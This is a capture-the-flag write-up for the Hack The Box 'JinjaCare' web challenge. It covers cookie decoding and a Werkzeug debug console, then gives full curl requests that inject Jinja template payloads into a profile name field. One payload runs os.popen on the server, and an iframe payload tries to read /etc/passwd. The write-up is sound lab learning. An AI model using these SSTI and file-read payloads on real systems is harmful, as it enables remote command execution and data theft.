---
slug: /write-up/htb/challenges/jinjacare
pagination_next: null
pagination_prev: null
---

# Jinjacare

https://app.hackthebox.com/challenges/JinjaCare

Jinjacare is a web app for managing COVID-19 vaccination records, allowing users to view history and generate digital certificates. You're invited to identify security vulnerabilities in the system and retrieve the hidden flag from the application.

## Recon

└─$ whatweb http://94.237.54.192:47055/
http://94.237.54.192:47055/ [200 OK] Country[FINLAND][FI], Email[info@jinjacare.com], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], Script, Title[JinjaCare - Home], nginx[1.22.1]

The source code is not bundled, so we can take a look.

Non-logged user interactions:

1) Login
2) Register
3) Verify certificate

Logged interactions:

4) Download certificate
5) Update personal info
6) Add record to medical history
7) Add vaccination record

The downloaded certificate has a QR worth exploring... it has the URL to verify the certificate. When verifying the certificate, we get:

```
Certificate is valid
Name: Test test

Issue Date: 2025-08-02

Status: Valid

Certificate ID: 4b7c8a77-1d21-43b8-9f95-cdd81ca988fc
```

So, it's a way of exposing data, we would need to have the certificate ID.

Regarding the session cookie:

The value is a signed, URL-safe, possibly zlib-compressed Base64-encoded token.

Likely generated using Python’s itsdangerous or Django/Flask session management.

You need the secret key to decode it completely and safely.

```python
from itsdangerous import URLSafeTimedSerializer

# Substitute with your actual secret key
secret_key = 'secret'
serializer = URLSafeTimedSerializer(secret_key)

decoded = serializer.loads('eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4')
print(decoded)
```

With burp suite, we see the session cookie changes from

```
Cookie: session=.eJwlzjEOwzAIQNG7eO4AiTGQy0SAQe2aNFPVuzdS168_vE_b68jz2bb3ceWj7a_ZtjZmp3DsOBkkhkSl5VAJWZJMGbSjswMOMcNl8P2WrhVlQHK3FE21hI6dNdhUXIdBiWDmuroRYWQJBc8FlHGCeDoPZSq0dkOuM4-_Btv3B9TaL5E.aI3PQw.13X6VlkbhdbnEyvL-flGMof2DX4
```

to

```
Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.aI3UXA.CYoLW8CfalTCefLOSG2huGM7ptg
```

With base64 decode, we got:

```json
{"_fresh": false}
```

Maybe we can copy the contents of this cookie, to get acess to the dashboard.

Most likely, we'll need to get a way to retrieve a UUID and then call the verify

Doing directory bruteforce, we can find an interesting directory: `console`. Looks like it's a Console // Werkzeug Debugger

which asks for a PIN. We can compute this PIN, but will need access to the machine itself.

The output is reflected in the generated PDF, we might be able to inject some malicious payload in the Full Name field.

## SSTI

From the downloaded PDF, we can see that is generate with `whhtmltopdf`. Looks like we can break PDF Generation using `{` char. When the full name is set to `{{{{{` the PDF generation breaks with :

```
Error generating certificate: unexpected '<'
```

or with another payload:

```
<iframe src=”file:///etc/passwd” height=”500” width=”500”>
```

the error is:

```
Error generating certificate: wkhtmltopdf reported an error: The switch --no-outline, is not support using unpatched qt, and will be ignored.QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root' Exit with code 1 due to network error: ContentNotFoundError
```

which looks like the output of the command, so we have command injection vulnerability here.

However, judging by the name of the challenge, we might be lucky to have simple Jinja template injection on the Full Name field 

Call to update the profile
```shell
curl 'http://94.237.50.221:34050/profile/personal' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://94.237.50.221:34050' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://94.237.50.221:34050/profile/personal' \
  -H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'name={{2*2}}&email=test%40test.htb&phone=None&address=None&dateOfBirth=2025-08-05&gender=male&emergencyName=None&emergencyPhone=None&relationship=None'
  ```

  In the PDF we can see the number 4 reflected, so looks like we have simple template injection working. No need to try to break whtmltopdf to explot the command injection.

  According to https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection, the next thing is identify the templating engine, if you look at the tittle of change, there are high chances we're dealing with Jinja templating engine.

  We can use SSTI to read the files in the server, and we see there's a flag.txt

  ```
  curl 'http://94.237.50.221:34050/profile/personal' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://94.237.50.221:34050' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://94.237.50.221:34050/profile/personal' \
  -H 'Cookie: session=.eJwlzjEOwzAIQNG7eO6AMWCSy0TYgNrVaaaqd2-krn_4ep9y5IrzWfb3uuJRjpeXvWDOHg2yq5s7NNbNqNuksF5RqhCYskSISAuoxA3gDjpy-KYcc7RqW-1pg6cPYk3MRoDzHtJIlB6oShpmJonMYSToiiKjZrkh1xnrr6nl-wPM4y-d.aI9hZw.09HnWSM3dAKtNpbgpOxn0tUS9C8' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'name={{config.__class__.__init__.__globals__["os"].popen("ls /").read()}}&email=test%40test.htb&phone=None&address=None&dateOfBirth=2025-08-05&gender=male&emergencyName=None&emergencyPhone=None&relationship=None'
  ```

  And we got the flag!